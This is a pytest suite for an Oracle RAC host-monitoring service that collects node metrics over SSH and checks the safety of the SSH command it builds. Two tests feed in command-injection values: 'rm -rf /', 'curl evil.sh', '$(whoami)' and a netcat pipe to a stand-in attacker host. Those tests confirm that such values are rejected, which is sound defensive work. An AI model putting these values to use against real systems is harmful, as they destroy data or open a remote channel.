"""
Tests for RAC multi-node host monitoring over the single installed agent.

Run with:  pytest tests/test_oracle_rac_host.py -v

The agent channel is stubbed, so what is exercised is the decision layer: which
node is collected directly, how the remote command is constructed, and what is
reported when SSH will not connect.

The command-shape tests matter most. They are the difference between "we chose
not to ask for a password" and "we accidentally allow one", and between
verifying a host key and trusting whatever answers.
"""
import pytest

from app.services.oracle import oracle_rac_host_service as rac


TWO_NODES = {
    "status": "success", "is_rac": True,
    "nodes": [
        {"instance_number": 1, "instance_name": "KCDB1", "host_name": "koebomebspatdb01",
         "instance_status": "OPEN", "database_status": "ACTIVE", "active_sessions": 210},
        {"instance_number": 2, "instance_name": "KCDB2", "host_name": "koebomebspatdb02",
         "instance_status": "OPEN", "database_status": "ACTIVE", "active_sessions": 208},
    ],
}

# Enough collector output for parse_linux to produce a real snapshot.
COLLECTOR_OUT = """@@SYS@@
Oracle Linux Server 8.8
Linux 5.15.0
koebomebspatdb02
@@UPTIME@@
up 4 days, 2 hours
@@LOAD@@
1.20 1.05 0.98 2/900 12345
@@CPU@@
%Cpu(s):  7.4 us,  2.1 sy,  0.0 ni, 89.0 id
@@MEM@@
64000 41000 23000 21000
@@DISK@@
/dev/sda1       50G   20G   30G  40% /
@@END@@
"""


@pytest.fixture
def agent(monkeypatch):
    """Record every command the agent is asked to run and reply to it.

    Dispatch is on the command's SHAPE, not a substring: the collector bundle's
    own first line contains `hostname`, so substring matching would answer the
    bundle with a hostname.
    """
    state = {"cmds": [], "token": "tok-1",
             "hostname": (0, "koebomebspatdb01\n"), "id": (0, "itc\n"),
             "ssh": (0, ""), "local": (0, "")}

    def shell(token, cmd, timeout=None):
        state["cmds"].append(cmd)
        c = cmd.strip()
        if c == "hostname":
            reply = state["hostname"]
        elif c == "id -un":
            reply = state["id"]
        elif c.startswith("ssh "):
            reply = state["ssh"]
        else:
            reply = state["local"]
        if isinstance(reply, Exception):
            raise reply
        return reply

    monkeypatch.setattr(rac, "_agent_shell", shell)
    monkeypatch.setattr(
        "app.services.oracle.oracle_monitoring_service.oracle_rac_nodes",
        lambda conn_id, db: TWO_NODES,
    )
    monkeypatch.setattr(
        "app.services.common.db_proxy_service.agent_host_for_conn",
        lambda conn_id, db: type("A", (), {"token": state["token"]})(),
    )
    rac._CACHE.clear()
    monkeypatch.delenv("ACTMON_RAC_SSH_USER", raising=False)
    return state


def healthy(state, user="itc"):
    state["hostname"] = (0, "koebomebspatdb01\n")
    state["id"] = (0, f"{user}\n")
    state["ssh"] = (0, COLLECTOR_OUT)      # the remote node
    state["local"] = (0, COLLECTOR_OUT)    # the local node, bundle run directly


# ── which node is collected how ────────────────────────────────────────────

def test_local_node_is_collected_directly_and_remote_over_ssh(agent):
    healthy(agent)
    out = rac.oracle_rac_node_hosts(1, None)
    by_inst = {n["instance_number"]: n for n in out["nodes"]}

    assert by_inst[1]["source"] == "agent"
    assert by_inst[1]["is_agent_host"] is True
    assert by_inst[2]["source"] == "ssh-via-agent"
    assert by_inst[2]["is_agent_host"] is False
    assert out["hosts_reachable"] == 2


def test_agent_host_is_asked_for_not_assumed(agent):
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    assert any(c.strip() == "hostname" for c in agent["cmds"])


def test_local_node_is_matched_on_short_name(agent):
    """GV$INSTANCE may report an FQDN while `hostname` reports the short form."""
    healthy(agent)
    agent["hostname"] = (0, "koebomebspatdb01.ebsdb.nprd.oraclevcn.com\n")
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["nodes"][0]["is_agent_host"] is True
    assert out["nodes"][1]["is_agent_host"] is False


def test_host_metrics_are_parsed_into_the_shared_shape(agent):
    healthy(agent)
    node2 = rac.oracle_rac_node_hosts(1, None)["nodes"][1]
    assert node2["os"] == "Oracle Linux Server 8.8"
    assert node2["uptime"] == "up 4 days, 2 hours"
    assert node2["cpu_pct"] is not None
    assert node2["memory"]["total_mb"] == 64000
    assert node2["disk_usage"] == "40%"
    # Oracle-side facts ride alongside the host ones.
    assert node2["instance_name"] == "KCDB2"
    assert node2["active_sessions"] == 208


# ── the security properties ────────────────────────────────────────────────

def test_ssh_can_never_prompt_for_a_password(agent):
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    ssh = next(c for c in agent["cmds"] if c.startswith("ssh "))
    assert "BatchMode=yes" in ssh
    assert "NumberOfPasswordPrompts=0" in ssh


def test_host_key_verification_is_preserved(agent):
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    ssh = next(c for c in agent["cmds"] if c.startswith("ssh "))
    assert "StrictHostKeyChecking=yes" in ssh
    # accept-new would trust an unknown host on first contact; no is worse still.
    assert "StrictHostKeyChecking=no" not in ssh
    assert "accept-new" not in ssh


def test_no_credential_appears_in_the_command(agent):
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    joined = " ".join(agent["cmds"])
    # NumberOfPasswordPrompts=0 is the option that GUARANTEES no prompt, so it
    # is excluded before looking for anything password-shaped.
    scrubbed = joined.replace("NumberOfPasswordPrompts=0", "").lower()
    for leak in ("password", "passwd", "sshpass", "-pw ", "askpass"):
        assert leak not in scrubbed, f"{leak!r} appeared in a command"


@pytest.mark.parametrize("evil", [
    "node2; rm -rf /",
    "node2 && curl evil.sh",
    "$(whoami)",
    "node2`id`",
    "node2|nc attacker 1234",
])
def test_a_hostile_host_name_never_reaches_a_command_line(agent, evil):
    """HOST_NAME is set in the database, so it is input, not fact."""
    healthy(agent)
    nodes = dict(TWO_NODES)
    nodes["nodes"] = [TWO_NODES["nodes"][0], dict(TWO_NODES["nodes"][1], host_name=evil)]
    import app.services.oracle.oracle_monitoring_service as mon
    mon.oracle_rac_nodes = lambda conn_id, db: nodes
    rac._CACHE.clear()

    out = rac.oracle_rac_node_hosts(1, None)
    bad = out["nodes"][1]
    assert bad["host_reachable"] is False
    assert bad["failure_reason"] == "bad_hostname"
    assert not any(evil in c for c in agent["cmds"])


def test_the_collector_is_the_only_thing_run_remotely(agent):
    """Base64 keeps the bundle intact; it must still be the bundle and nothing
    appended to it."""
    import base64
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    ssh = next(c for c in agent["cmds"] if c.startswith("ssh "))
    payload = ssh.split("echo ")[1].split(" |")[0]
    decoded = base64.b64decode(payload).decode()
    assert decoded == rac.LINUX_COLLECTOR_BUNDLE


# ── failure handling ───────────────────────────────────────────────────────

@pytest.mark.parametrize("stderr,reason", [
    ("Permission denied (publickey,password).", "ssh_auth"),
    ("Host key verification failed.", "ssh_hostkey"),
    ("ssh: Could not resolve hostname koebomebspatdb02", "dns"),
    ("ssh: connect to host port 22: Connection timed out", "network"),
    ("bash: ssh: command not found", "no_ssh_client"),
])
def test_each_ssh_failure_is_classified_with_a_remedy(agent, stderr, reason):
    healthy(agent)
    agent["ssh"] = (255, stderr)
    out = rac.oracle_rac_node_hosts(1, None)
    node2 = out["nodes"][1]
    assert node2["host_reachable"] is False
    assert node2["failure_reason"] == reason
    assert node2["remedy"]


def test_an_unreachable_node_does_not_hide_its_oracle_status(agent):
    """The instance can be perfectly healthy while its host is unreachable; the
    page must not imply otherwise."""
    healthy(agent)
    agent["ssh"] = (255, "Permission denied (publickey).")
    node2 = rac.oracle_rac_node_hosts(1, None)["nodes"][1]
    assert node2["instance_status"] == "OPEN"
    assert node2["active_sessions"] == 208
    assert node2["host_reachable"] is False


def test_one_unreachable_node_does_not_break_the_other(agent):
    healthy(agent)
    agent["ssh"] = (255, "Permission denied (publickey).")
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["status"] == "success"
    assert out["nodes"][0]["host_reachable"] is True
    assert out["hosts_reachable"] == 1


def test_no_agent_still_returns_the_oracle_side(agent, monkeypatch):
    monkeypatch.setattr("app.services.common.db_proxy_service.agent_host_for_conn",
                        lambda conn_id, db: None)
    rac._CACHE.clear()
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["agent_present"] is False
    assert [n["instance_name"] for n in out["nodes"]] == ["KCDB1", "KCDB2"]
    assert all(n["failure_reason"] == "no_agent" for n in out["nodes"])


def test_a_refused_agent_permission_is_reported_not_raised(agent):
    healthy(agent)
    agent["ssh"] = RuntimeError("This agent was not granted the 'Run commands' permission.")
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["status"] == "success"
    assert out["nodes"][1]["host_reachable"] is False


# ── ssh user resolution ────────────────────────────────────────────────────

def test_ssh_user_defaults_to_whoever_the_agent_runs_as(agent):
    healthy(agent, user="itc")
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["ssh_user"] == "itc"
    assert out["ssh_user_source"] == "agent_user"
    assert "itc@koebomebspatdb02" in next(c for c in agent["cmds"] if c.startswith("ssh "))


def test_an_explicit_override_wins(agent, monkeypatch):
    monkeypatch.setenv("ACTMON_RAC_SSH_USER", "oracle")
    healthy(agent, user="root")
    rac._CACHE.clear()
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["ssh_user"] == "oracle"
    assert out["ssh_user_source"] == "configured"


def test_a_hostile_override_is_rejected(agent, monkeypatch):
    monkeypatch.setenv("ACTMON_RAC_SSH_USER", "root; rm -rf /")
    healthy(agent)
    rac._CACHE.clear()
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["ssh_user"] is None
    assert out["nodes"][1]["failure_reason"] == "no_user"
    assert not any("rm -rf" in c for c in agent["cmds"])


# ── caching ────────────────────────────────────────────────────────────────

def test_repeated_calls_do_not_reopen_ssh(agent):
    """The RAC tab refreshes every 15s; SSHing to every node at that rate is a
    sustained load on the cluster for information that does not change."""
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    first = len(agent["cmds"])
    rac.oracle_rac_node_hosts(1, None)
    rac.oracle_rac_node_hosts(1, None)
    assert len(agent["cmds"]) == first


# ── registration happens from the collecting pass ──────────────────────────
#
# Registration used to live only in the agent collector cycle, so the RAC tab
# showed both nodes while the servers page still showed one — for however long
# that cycle took to come round. The data was already in hand.

def test_registration_runs_when_nodes_are_collected(agent, monkeypatch):
    seen = {}

    def fake_sync(conn_id, db):
        seen["conn_id"] = conn_id
        return {"synced": [{"host": "koebomebspatdb02"}], "skipped": [], "errors": []}

    monkeypatch.setattr(
        "app.services.oracle.oracle_rac_registration_service.sync_rac_hosts", fake_sync)
    healthy(agent)
    out = rac.oracle_rac_node_hosts(1, None)
    assert seen.get("conn_id") == 1
    assert out["registration"]["synced"]


def test_registration_does_not_recollect(agent, monkeypatch):
    """sync_rac_hosts reads oracle_rac_node_hosts. The cache must already be
    populated when it does, or registering would trigger a second round of SSH
    to every node."""
    calls = {"n": 0}

    def fake_sync(conn_id, db):
        calls["n"] = len([c for c in agent["cmds"] if c.startswith("ssh ")])
        rac.oracle_rac_node_hosts(conn_id, db)          # re-entry
        calls["after"] = len([c for c in agent["cmds"] if c.startswith("ssh ")])
        return {"synced": [], "skipped": [], "errors": []}

    monkeypatch.setattr(
        "app.services.oracle.oracle_rac_registration_service.sync_rac_hosts", fake_sync)
    healthy(agent)
    rac.oracle_rac_node_hosts(1, None)
    assert calls["after"] == calls["n"], "registering re-ran the SSH collection"


def test_a_failing_registration_never_breaks_the_tab(agent, monkeypatch):
    monkeypatch.setattr(
        "app.services.oracle.oracle_rac_registration_service.sync_rac_hosts",
        lambda conn_id, db: (_ for _ in ()).throw(RuntimeError("db is down")))
    healthy(agent)
    out = rac.oracle_rac_node_hosts(1, None)
    assert out["status"] == "success"
    assert out["hosts_reachable"] == 2
    assert out["registration"]["errors"]
